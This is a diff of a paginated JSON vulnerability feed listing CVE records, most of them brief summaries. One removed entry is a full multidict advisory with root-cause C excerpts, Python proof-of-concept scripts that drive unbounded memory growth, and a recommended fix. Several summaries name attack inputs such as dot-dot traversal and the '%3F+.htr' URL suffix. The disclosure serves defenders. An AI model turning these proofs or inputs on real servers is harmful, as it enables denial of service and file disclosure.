@@ -1,893 +1,901 @@
 {
   "version": "1.0",
-  "lastUpdated": "2026-11-23",
+  "lastUpdated": "2026-11-24",
   "source": "CIRCL CVE Search + GitHub Advisory OSV + CISA KEV + NIST NVD",
   "pagination": {
     "page": 141,
     "pageSize": 50,
-    "totalPages": 289,
-    "totalItems": 14444,
+    "totalPages": 290,
+    "totalItems": 14474,
     "hasNextPage": true,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-2026-104874",
-      "summary": "## Description\n\nA reference leak in the items-view union and subtraction operators of aio-libs/multidict 6.7.0 through 6.9.0 (C extension) lets a remote client drive unbounded, unreclaimable memory growth by having each operand element leak one key-identity object and one value object. The reflected-union path (`operand | d.items()`, `multidict_itemsview_or2_impl`) and the subtraction path (`d.items() - operand`, `multidict_itemsview_sub1_impl`) parse each element into new strong references but release only the tuple wrapper, never the identity and value. Servers in the aio-libs stack build these views over attacker-supplied HTTP headers and query strings, so the operand size is under remote control. Forced garbage collection does not recover the leaked objects, so resident memory rises monotonically until the process is killed.\n\n## Root Cause\n\n`_multidict_itemsview_parse_item()` returns **new** references: a fresh identity via `md_calc_identity()` and a fresh value via `Py_NewRef()`. The `or2_impl` first parse loop requests both but clears only `arg`:\n\n```c\n// views.h:565 — or2_impl first parse loop\nwhile ((st = PyIter_NextItem(iter, &arg)) > 0) {\n    int tmp = _multidict_itemsview_parse_item(\n        self, arg, &identity, NULL, &value);   // identity + value: new refs\n    if (tmp < 0) goto fail;\n    else if (tmp > 0) {\n        if (_set_add(tmp_set, identity, value) < 0) goto fail;\n    }\n    Py_CLEAR(arg);                             // :575 clears arg ONLY\n}\n```\n\n`_set_add()` builds its own tuple with `PyTuple_Pack` and `Py_DECREF`s it, so it never borrows the loop's `identity`/`value`. On the next iteration those variables are overwritten, so the previous references are lost permanently. The `sub1_impl` first loop (`:686-696`) has the identical omission.\n\nThis is an editing slip, not an ownership contract: every sibling path clears all three references per iteration, `and1_impl` (`:304-306`), `and2_impl` (`:389-391`), `or1_impl` (`:506-508`), and the second (`md_next`) loops of both functions (`:605-607`, `:726-728`). PR #1413 added a `Py_DECREF(tpl)` to the *second* loop of `or2`/`sub1`, fixing a different temporary-tuple leak; it never touched the first parse loop, so this leak remains on `master`.\n\n`views.h` is byte-identical between `v6.6.0` and `v6.7.0`, yet 6.6.4 does not leak and 6.7.0 does. The regression is behavioural, introduced by a key-identity ownership change in `hashtable.h` across that boundary that made `md_calc_identity()` return a fresh strong reference the unchanged parse loop never releases.\n\n## Reproduction Environment\n\n| Item | Value |\n|------|-------|\n| **Runtime** | CPython 3.14.6 |\n| **multidict** | 6.9.0 (PyPI binary wheel, C extension) |\n| **OS** | macOS (darwin 25.6.0, arm64) |\n\n## Proof of Concept\n\n### POC Source Code\n\n#### poc_refcount.py — leak proof with intersection control\n\n```python\nimport sys, gc\nfrom multidict import CIMultiDict\n\ndef probe(name, run_op):\n    d = CIMultiDict(); d[\"seed\"] = \"x\"\n    value = object()                 # unique sentinel\n    N = 100000\n    operand = [(\"k%d\" % i, value) for i in range(N)]\n    gc.collect(); before = sys.getrefcount(value)\n    run_op(d, operand)\n    gc.collect(); after = sys.getrefcount(value)\n    print(f\"[{name}] leaked strong refs = {after - before}\")\n\nprobe(\"or2  operand | items\", lambda d, o: o | d.items())    # reflected union\nprobe(\"sub1 items - operand\", lambda d, o: d.items() - o)    # subtraction\nprobe(\"and2 items & operand\", lambda d, o: d.items() & o)    # CONTROL: clears, expect 0\n```\n\n#### poc_dispatch.py — maps which paths leak\n\n```python\nimport sys, gc\nfrom multidict import CIMultiDict\n\ndef probe(name, fn):\n    d = CIMultiDict(); d[\"seed\"] = \"x\"\n    v = object(); N = 50000\n    operand = [(\"k%d\" % i, v) for i in range(N)]\n    gc.collect(); before = sys.getrefcount(v)\n    fn(d, operand); gc.collect(); after = sys.getrefcount(v)\n    print(f\"{name:35s} leaked={after - before}\")\n\nprobe(\"operand | d.items()  (or2)\",  lambda d, o: o | d.items())\nprobe(\"d.items() | operand  (or1)\",  lambda d, o: d.items() | o)\nprobe(\"d.items() - operand  (sub1)\", lambda d, o: d.items() - o)\nprobe(\"operand - d.items()  (rsub)\", lambda d, o: set(o) - d.items())\nprobe(\"d.items() & operand  (and)\",  lambda d, o: d.items() & o)\n```\n\n#### poc_rss.py — availability consequence\n\n```python\nimport sys, gc, resource\nfrom multidict import CIMultiDict\n\ndef rss_mb():\n    r = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss\n    return r / (1024 * 1024) if sys.platform == \"darwin\" else r / 1024\n\nd = CIMultiDict(); d[\"seed\"] = \"x\"\ngc.collect(); print(f\"start RSS = {rss_mb():.1f} MB\")\nfor i in range(200):\n    operand = [(f\"k{i}_{j}\", f\"v{i}_{j}\") for j in range(50000)]\n    _ = operand | d.items()\n    del operand\n    gc.collect()                     # prove GC cannot reclaim the leak\n    if (i + 1) % 40 == 0:\n        print(f\"after {(i+1)*50000:>9,} elements: RSS = {rss_mb():.1f} MB\")\n```\n\n### Execution Steps\n\n1. `python3 -m venv venv` (CPython 3.10+).\n2. `./venv/bin/pip install \"multidict==6.9.0\"` (installs the C-extension wheel).\n3. From a directory that is **not** a multidict checkout, run each script with `./venv/bin/python`.\n\n### Actual Execution Evidence\n\n```\n[or2  operand | items] leaked strong refs = 100000\n[sub1 items - operand] leaked strong refs = 100000\n[and2 items & operand] leaked strong refs = 0        <- control\n```\n\n```\noperand | d.items()  (or2)          leaked=50000\nd.items() | operand  (or1)          leaked=0\nd.items() - operand  (sub1)         leaked=50000\noperand - d.items()  (rsub)         leaked=0\nd.items() & operand  (and)          leaked=0\n```\n\n```\nstart RSS = 15.6 MB\nafter 2,000,000 elements: RSS = 288.1 MB\nafter 6,000,000 elements: RSS = 776.8 MB\nafter 10,000,000 elements: RSS = 1266.8 MB   (gc.collect() every iteration)\n```\n\n### Version-boundary evidence\n\nSame `poc_dispatch.py`, PyPI wheels, identical environment. Last-clean is `6.6.4`; first-affected is `6.7.0`:\n\n```\n6.6.4 : or2=0      sub1=0      others=0   (clean, last 6.6.x)\n6.7.0 : or2=50000  sub1=50000  others=0   (AFFECTED, first)\n6.9.0 : or2=50000  sub1=50000  others=0   (affected)\n```\n\nThe clean 6.6.x releases return correct set-operation results, so the zero leak reflects correct memory management, not a broken path.\n\n### Analysis of Results\n\nThe operand holds exactly `N` references to one sentinel value; after the union its refcount rises by another `N` and stays there post-GC, so each element leaked one strong reference. Subtraction shows the identical delta. The intersection control, which clears `identity` and `value`, leaks zero; the only code difference is the two missing `Py_CLEAR` calls, so the leak is caused by that omission and not the harness. RSS climbs from 15.6 MB to 1266.8 MB (~250 MB per 2M elements) despite per-iteration GC, confirming the objects are unreachable by the cyclic collector.\n\n## Impact\n\nA process that evaluates items-view unions or subtractions over remote-influenced operands leaks one identity plus one value object per element, permanently. In the aio-libs stack multidict backs HTTP headers and query strings, so an attacker who enlarges the operand (for example, many repeated header items compared against a fixed allow/deny set) forces steady, unrecoverable heap growth and can eventually exhaust memory in a long-lived server. This is an availability defect only; results stay correct and no data is exposed.\n\nReachability depends on the application evaluating `operand | view.items()` (reflected union) or `view.items() - operand` (subtraction) over a sequence of 2-tuples whose count is remote-influenced. The forward union `view.items() | operand` routes to `or1_impl`, which clears correctly and does not leak; a non-tuple operand element takes the `parse_item` early-return and does not leak. Set algebra over items views is not the most common multidict usage, which bounds exposure and is why this is Medium, not High. This is distinct from PR #1413, which fixed a temporary-tuple leak in the second loop and did not release these per-element objects.\n\n## Remediation\n\n**Recommended fix.** Clear the two per-element references at the end of the first parse loop in both functions, exactly as every sibling path does. In `or2_impl` (`views.h:575`) and `sub1_impl` (`views.h:696`), replace the lone `Py_CLEAR(arg);` with:\n\n```c\n    Py_CLEAR(arg);\n    Py_CLEAR(identity);\n    Py_CLEAR(value);\n```\n\nThis is an in-repo change to a static internal function; it alters no public API, type, or signature, and asks callers to change nothing. A leak test in the existing `tests/test_leaks.py` style would lock it in.\n\n**Workaround.** Avoid `operand | view.items()` and `view.items() - operand` on attacker-influenced operands, or install with `MULTIDICT_NO_EXTENSIONS=1` to use the unaffected pure-Python build.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-401",
-        "name": "Missing Release of Memory after Effective Lifetime"
-      },
-      "references": [
-        "https://github.com/aio-libs/multidict/security/advisories/GHSA-54p9-h82j-f925",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-104874",
-        "https://github.com/aio-libs/multidict/commit/350b4a07bf8ff851b6d7544e81b1c748bdc74c40",
-        "https://github.com/aio-libs/multidict/releases/tag/v6.9.1",
-        "https://github.com/advisories/GHSA-54p9-h82j-f925"
-      ],
-      "vulnerableProducts": [
-        "multidict pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0631",
-      "summary": "Buffer overflow in the uudecoding feature for Adobe Acrobat Reader 5.0.5 and 5.0.6 for Unix and Linux, and possibly other versions including those before 5.0.9, allows remote attackers to execute arbitrary code via a long filename for the PDF file that is provided to the uudecode command.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-08-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://security.gentoo.org/glsa/glsa-200408-14.xml",
-        "http://www.adobe.com/support/techdocs/322914.html",
-        "http://www.idefense.com/application/poi/display?id=125&type=vulnerabilities",
-        "http://www.redhat.com/support/errata/RHSA-2004-432.html",
-        "http://www.securityfocus.com/bid/10932"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0722",
-      "summary": "Integer overflow in the SOAPParameter object constructor in (1) Netscape version 7.0 and 7.1 and (2) Mozilla 1.6, and possibly earlier versions, allows remote attackers to execute arbitrary code.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-08-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.sco.com/pub/updates/OpenServer/SCOSA-2005.49/SCOSA-2005.49.txt",
-        "http://bugzilla.mozilla.org/show_bug.cgi?id=236618",
-        "http://www.idefense.com/application/poi/display?id=117&type=vulnerabilities",
-        "http://www.novell.com/linux/security/advisories/2004_36_mozilla.html",
-        "http://www.redhat.com/support/errata/RHSA-2004-421.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0645",
-      "summary": "Buffer overflow in the wvHandleDateTimePicture function in wv library (wvWare) 0.7.4 through 0.7.6 and 1.0.0 allows remote attackers to execute arbitrary code via a document with a long DateTime field.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-08-06",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://cpan.cybercomm.nl/pub/gentoo-portage/app-text/wv/files/wv-1.0.0-fix_overflow.patch",
-        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000863",
-        "http://security.gentoo.org/glsa/glsa-200407-11.xml",
-        "http://www.debian.org/security/2004/dsa-579",
-        "http://www.freebsd.org/ports/portaudit/7a5430df-d562-11d8-b479-02e0185c0b53.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1313",
-      "summary": "Lotus Domino R5 before R5.0.7a allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via miscellaneous packets with semi-valid BER encodings, as demonstrated by the PROTOS LDAPv3 test suite.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-07-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://ciac.llnl.gov/ciac/bulletins/l-116.shtml",
-        "http://www.cert.org/advisories/CA-2001-18.html",
-        "http://www.ee.oulu.fi/research/ouspg/protos/testing/c06/ldapv3/",
-        "http://www.kb.cert.org/vuls/id/583184",
-        "http://www.notes.net/r5fixlist.nsf/Search%21SearchView&Query=DWUU4W6NC8"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0004",
-      "summary": "IIS 5.0 and 4.0 allows remote attackers to read the source code for executable web server programs by appending \"%3F+.htr\" to the requested URL, which causes the files to be parsed by the .HTR ISAPI extension, aka a variant of the \"File Fragment Reading via .HTR\" vulnerability.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-02-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97897954625305&w=2",
-        "http://www.securityfocus.com/bid/2313",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-004",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5903",
-        "http://marc.info/?l=bugtraq&m=97897954625305&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0005",
-      "summary": "Buffer overflow in the parsing mechanism of the file loader in Microsoft PowerPoint 2000 allows attackers to execute arbitrary commands.",
-      "cvssScore": 6.2,
-      "severity": "Medium",
-      "published": "2001-02-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.atstake.com/research/advisories/2001/a012301-1.txt",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-002",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5996",
-        "http://www.atstake.com/research/advisories/2001/a012301-1.txt",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-002"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1098",
-      "summary": "Cisco VPN 3000 Concentrator 2.2.x, and 3.x before 3.5.3, adds an \"HTTPS on Public Inbound (XML-Auto)(forward/in)\" rule but sets the protocol to \"ANY\" when the XML filter configuration is enabled, which ultimately allows arbitrary traffic to pass through the concentrator.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-10-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cisco.com/warp/public/707/vpn3k-multiple-vuln-pub.shtml",
-        "http://www.iss.net/security_center/static/10023.php",
-        "http://www.securityfocus.com/bid/5614",
-        "http://www.cisco.com/warp/public/707/vpn3k-multiple-vuln-pub.shtml",
-        "http://www.iss.net/security_center/static/10023.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1099",
-      "summary": "Cisco VPN 3000 Concentrator 2.2.x, and 3.x before 3.5.3, allows remote attackers to obtain potentially sensitive information without authentication by directly accessing certain HTML pages.",
+      "id": "CVE-2002-1039",
+      "summary": "Directory traversal vulnerability in Double Choco Latte (DCL) before 20020706 allows remote attackers to read arbitrary files via .. (dot dot) sequences when downloading files from the Projects: Attachments feature.",
       "cvssScore": 5,
       "severity": "Medium",
       "published": "2002-10-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.cisco.com/warp/public/707/vpn3k-multiple-vuln-pub.shtml",
-        "http://www.iss.net/security_center/static/10024.php",
-        "http://www.securityfocus.com/bid/5616",
-        "http://www.cisco.com/warp/public/707/vpn3k-multiple-vuln-pub.shtml",
-        "http://www.iss.net/security_center/static/10024.php"
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0022.html",
+        "http://dcl.sourceforge.net/index.php",
+        "http://marc.info/?l=bugtraq&m=102668783632589&w=2",
+        "http://www.iss.net/security_center/static/9743.php",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0022.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1100",
-      "summary": "Cisco VPN 3000 Concentrator 2.2.x, and 3.x before 3.5.3, allows remote attackers to cause a denial of service (crash) via a long (1) username or (2) password to the HTML login interface.",
+      "id": "CVE-2002-1040",
+      "summary": "Unknown vulnerability in the WebSecure (DFSWeb) configuration utilities in AIX 4.x, possibly related to relative pathnames.",
       "cvssScore": 5,
       "severity": "Medium",
       "published": "2002-10-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.cisco.com/warp/public/707/vpn3k-multiple-vuln-pub.shtml",
-        "http://www.iss.net/security_center/static/10025.php",
-        "http://www.securityfocus.com/bid/5617",
-        "http://www.cisco.com/warp/public/707/vpn3k-multiple-vuln-pub.shtml",
-        "http://www.iss.net/security_center/static/10025.php"
+        "http://archives.neohapsis.com/archives/aix/2002-q3/0000.html",
+        "http://archives.neohapsis.com/archives/aix/2002-q3/0000.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1118",
-      "summary": "Buffer overflow in the SETI@home client 3.03 and other versions allows remote attackers to cause a denial of service (client crash) and execute arbitrary code via a spoofed server response containing a long string followed by a \\n (newline) character.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2003-April/004383.html",
-        "http://www.kb.cert.org/vuls/id/146785",
-        "http://www.securityfocus.com/bid/7292",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11731",
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2003-April/004383.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0978",
-      "summary": "Format string vulnerability in gpgkeys_hkp (experimental HKP interface) for the GnuPG (gpg) client 1.2.3 and earlier, and 1.3.3 and earlier, allows remote attackers or a malicious keyserver to cause a denial of service (crash) and possibly execute arbitrary code during key retrieval.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-01-05",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107047470625214&w=2",
-        "http://www.novell.com/linux/security/advisories/2003_048_gpg.html",
-        "http://www.s-quadra.com/advisories/Adv-20031203.txt",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13892",
-        "http://marc.info/?l=bugtraq&m=107047470625214&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0979",
-      "summary": "FreeScripts VisitorBook LE (visitorbook.pl) does not properly escape line breaks in input, which allows remote attackers to (1) use VisitorBook as an open mail relay, when $mailuser is 1, via extra headers in the email field, or (2) cause the guestbook database to be deleted via a large number of line breaks that exceeds the $max_posts variable.",
+      "id": "CVE-2002-1041",
+      "summary": "Unknown vulnerability in DCE (1) SMIT panels and (2) configuration commands, possibly related to relative pathnames.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2004-01-05",
+      "published": "2002-10-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=107107840622493&w=2",
-        "http://www.westpoint.ltd.uk/advisories/wp-03-0001.txt",
-        "http://marc.info/?l=bugtraq&m=107107840622493&w=2",
-        "http://www.westpoint.ltd.uk/advisories/wp-03-0001.txt"
+        "http://archives.neohapsis.com/archives/aix/2002-q3/0000.html",
+        "http://archives.neohapsis.com/archives/aix/2002-q3/0000.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0407",
-      "summary": "htcgibin.exe in Lotus Domino server 5.0.9a and earlier allows remote attackers to determine the physical pathname for the server via requests that contain certain MS-DOS device names such as com5, such as (1) a request with a .pl or .java extension, or (2) a request containing a large number of periods, which causes htcgibin.exe to leak the pathname in an error message.",
+      "id": "CVE-2002-1042",
+      "summary": "Directory traversal vulnerability in search engine for iPlanet web server 6.0 SP2 and 4.1 SP9, and Netscape Enterprise Server 3.6, when running on Windows platforms, allows remote attackers to read arbitrary files via ..\\ (dot-dot backslash) sequences in the NS-query-pat parameter.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-07-26",
+      "published": "2002-10-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=101310812804716&w=2",
-        "http://www.iss.net/security_center/static/8160.php",
-        "http://www.securityfocus.com/archive/1/265380",
-        "http://www.securityfocus.com/bid/4406",
-        "http://marc.info/?l=bugtraq&m=101310812804716&w=2"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0085.html",
+        "http://www.iss.net/security_center/static/9517.php",
+        "http://www.securityfocus.com/bid/5191",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0085.html",
+        "http://www.iss.net/security_center/static/9517.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0408",
-      "summary": "htcgibin.exe in Lotus Domino server 5.0.9a and earlier, when configured with the NoBanner setting, allows remote attackers to determine the version number of the server via a request that generates an HTTP 500 error code, which leaks the version in a hard-coded error message.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-07-26",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=101310812804716&w=2",
-        "http://marc.info/?l=bugtraq&m=101785616526383&w=2",
-        "http://www.securityfocus.com/bid/4049",
-        "http://marc.info/?l=bugtraq&m=101310812804716&w=2",
-        "http://marc.info/?l=bugtraq&m=101785616526383&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1234",
-      "summary": "LSA (LSASS.EXE) in Windows NT 4.0 allows remote attackers to cause a denial of service via a NULL policy handle in a call to (1) SamrOpenDomain, (2) SamrEnumDomainUsers, and (3) SamrQueryDomainInfo.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-10-26",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=ntbugtraq&m=94096671308565&w=2",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3293",
-        "http://marc.info/?l=ntbugtraq&m=94096671308565&w=2",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3293"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0882",
-      "summary": "Falcon web server allows remote attackers to determine the absolute path of the web root via long file names.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-10-28",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0882",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0882"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0915",
-      "summary": "URL Live! web server allows remote attackers to read arbitrary files via a .. (dot dot) attack.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-10-28",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.osvdb.org/1129",
-        "http://www.securityfocus.com/bid/746",
-        "http://www.osvdb.org/1129",
-        "http://www.securityfocus.com/bid/746"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0950",
-      "summary": "Buffer overflow in WFTPD FTP server allows remote attackers to gain root access via\ta series of MKD and CWD commands that create nested directories.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "1999-10-28",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/747",
-        "http://www.securityfocus.com/bid/747"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1226",
-      "summary": "Netscape Communicator 4.7 and earlier allows remote attackers to cause a denial of service, and possibly execute arbitrary commands, via a long certificate key.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "1999-10-28",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securiteam.com/exploits/Netscape_4_7_and_earlier_vulnerable_to__Huge_Key__DoS.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3436",
-        "http://www.securiteam.com/exploits/Netscape_4_7_and_earlier_vulnerable_to__Huge_Key__DoS.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3436"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-116640",
-      "summary": "A flaw has been found in Saruf-Ratul HR-Payroll-Management-System e7cd81477001afdee95b843fd4137894d9418c9f/3fd6f45ead9f8197510c0910f759e06ee67251e5. Affected by this vulnerability is an unknown functionality of the file chat.php. Executing a manipulation of the argument ID can lead to cross site scripting. It is possible to launch the attack remotely. The exploit has been published and may be used. This product takes the approach of rolling releases to provide continious delivery. Therefore, version details for affected and updated releases are not available. The project was informed of the problem early through an issue report but has not responded yet.",
-      "cvssScore": 3.5,
-      "severity": "Low",
-      "published": "2026-10-27",
-      "modified": null,
-      "cwe": "CWE-79",
-      "references": [
-        "https://github.com/Saruf-Ratul/HR-Payroll-Management-System/",
-        "https://github.com/Saruf-Ratul/HR-Payroll-Management-System/issues/1",
-        "https://vuldb.com/cve/CVE-2026-116640",
-        "https://vuldb.com/submit/1024502",
-        "https://vuldb.com/vuln/426581"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-116639",
-      "summary": "A vulnerability was detected in MD-MAFUJUL-HASAN Online-Payroll-Management-System up to a8902bf64575e325f6d6bf93a55f7bd273ec58cd. Affected is an unknown function of the file chat.php. Performing a manipulation of the argument ID results in cross site scripting. It is possible to initiate the attack remotely. The exploit is now public and may be used. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available. The project was informed of the problem early through an issue report but has not responded yet.",
-      "cvssScore": 3.5,
-      "severity": "Low",
-      "published": "2026-10-27",
-      "modified": null,
-      "cwe": "CWE-79",
-      "references": [
-        "https://github.com/MD-MAFUJUL-HASAN/Online-Payroll-Management-System/",
-        "https://github.com/MD-MAFUJUL-HASAN/Online-Payroll-Management-System/issues/2",
-        "https://vuldb.com/cve/CVE-2026-116639",
-        "https://vuldb.com/submit/1024501",
-        "https://vuldb.com/vuln/426580"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-111147",
-      "summary": "Libyal libesedb through 20260704 contains a heap out-of-bounds read vulnerability in libesedb_record_get_multi_value() that allows attackers to read past buffers via unbounded multi-value offset tables. Attackers can supply a crafted ESE/EDB database processed by esedbexport to crash the application or expose up to about 32 KiB of adjacent heap memory.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-10-15",
-      "modified": null,
-      "cwe": "CWE-125",
-      "references": [
-        "https://github.com/libyal/libesedb",
-        "https://github.com/libyal/libesedb/blob/cf49b6d420d4a44dcd6355bc0d6b36f9f580f350/libesedb/libesedb_record.c#L3776-L3830",
-        "https://hackmd.io/@haind-pwn/libesedb-multi-value-offset-table-oob-read",
-        "https://www.vulncheck.com/advisories/libyal-libesedb-through-20260704-heap-out-of-bounds-read-via-libesedb-record-get-multi-value"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-110613",
-      "summary": "youlai-mall through commit 9f62de8 contains a missing authorization vulnerability that allows authenticated members to view every customer's orders via the app order list endpoint. Attackers can page through the oms_order table using a self-registered account to read order ids, order_sn values, member ids, payment amounts, and order status.",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2026-10-14",
-      "modified": null,
-      "cwe": "CWE-639",
-      "references": [
-        "https://github.com/youlaitech/youlai-mall",
-        "https://github.com/youlaitech/youlai-mall/blob/9f62de811d478b3ab6b27438efd58e2c4fdb4c31/mall-oms/oms-boot/src/main/java/com/youlai/mall/oms/controller/app/OrderController.java#L33-L38",
-        "https://github.com/youlaitech/youlai-mall/blob/9f62de811d478b3ab6b27438efd58e2c4fdb4c31/mall-oms/oms-boot/src/main/resources/mapper/OmsOrderMapper.xml#L15-L52",
-        "https://hackmd.io/@1ExmmukzRMWN7B4gQ4W-4Q/youlai-mall-order-list-cross-member-disclosure",
-        "https://www.vulncheck.com/advisories/youlai-mall-through-commit-9f62de8-order-information-disclosure-via-app-order-list"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108692",
-      "summary": "1Panel-dev CordysCRM from 1.9.0 before 1.9.2 contains a missing authorization vulnerability in eight ModuleFieldController /field/source data-source endpoints lacking permission checks. Authenticated users denied module permission can page through organization-wide leads, contacts, quotations, contracts, payment plans, payment records, orders and invoices owned by other users.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108692",
-        "https://github.com/1Panel-dev/CordysCRM/commit/a31fa16fb2dc86ab6b0fdc1ee58a204af424f38d",
-        "https://github.com/1Panel-dev/CordysCRM/blob/a0ef69d31fd98c338199579353840f34ef679197/backend/crm/src/main/java/cn/cordys/common/service/DataScopeService.java#L100-L110",
-        "https://github.com/1Panel-dev/CordysCRM/blob/a0ef69d31fd98c338199579353840f34ef679197/backend/crm/src/main/java/cn/cordys/crm/system/controller/ModuleFieldController.java#L133-L266",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/CordysCRM/poc_field_source_family.py"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108702",
-      "summary": "1Panel-dev CordysCRM through 1.9.3 lacks a PROCESS_SETTING permission check on POST /approval-flow/webhook/test, allowing any authenticated user to trigger server-side requests to attacker-supplied URLs. Attackers can redirect GET requests from a controlled host to bypass SSRFValidator and probe internal addresses through success or failure results.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108702",
